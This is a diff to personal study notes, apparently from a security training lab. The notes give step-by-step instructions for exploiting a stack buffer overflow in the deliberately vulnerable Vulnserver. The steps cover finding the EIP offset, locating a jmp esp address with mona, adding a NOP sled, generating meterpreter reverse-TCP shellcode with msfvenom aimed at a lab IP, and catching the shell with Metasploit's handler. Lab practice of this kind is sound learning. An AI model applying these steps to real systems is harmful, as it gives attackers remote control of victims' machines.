@@ -620,11 +620,18 @@ https://z3r0th.medium.com/a-simple-buffer-overflow-using-vulnserver-86b011eb673b
     8. once broken, go into wiremask and copy the value you used into length. -> then copy and paste the pattern into your script in the buf += part.
     9. run the script with the new buf, copy and paste the EIP as the register value in wiremask to find the offset.
     10. go back into your script. delete the pattern you put in buf +=, and add the offset value you got from wiremask.
-    11. add another buf += "B" * 4
-    12.
+    11. add another buf += "B" * 4 -> sen script, check new EIP to see if it worked.
+    12. if its broken, rewind and hit play again. type !mona modules at the bottom. -> then run !mona jmp -r esp -m "essfunc.dll" -> click l at the top if it goes away.
+    13. go down to where you see your command, copy and paste the address of the first result. -> add that jmp esp to your exploit (you're replacing the "B" with this in little endian)
+    14. then below that line, add buf += "\x90" * 15
+    15. then on linops -> msfvenom -p windows/meterpreter/reverse_tcp lhost=10.50.36.204 lport=10000 -b "\x00" -f python (the lhost is linops ip)
+    16. The command above generates shellcode, do not take the first line.
+    17. go back into msfconsole -> use multi/handler -> show options -> set payload windows/meterpreter/reverse_tcp -> set LHOST 0.0.0.0 -> set LPORT 10000 (change the LPORT to whatever you used in msfvenom)
+    18. ensure the malware is running on winops -> type 'exploit' on msfconsole -> then run your script in another window 'python win_buf.py) -> this should give you a shell on the victim device. -> type help to look for commands.
     
     
     
+    625012A0
     
     
     
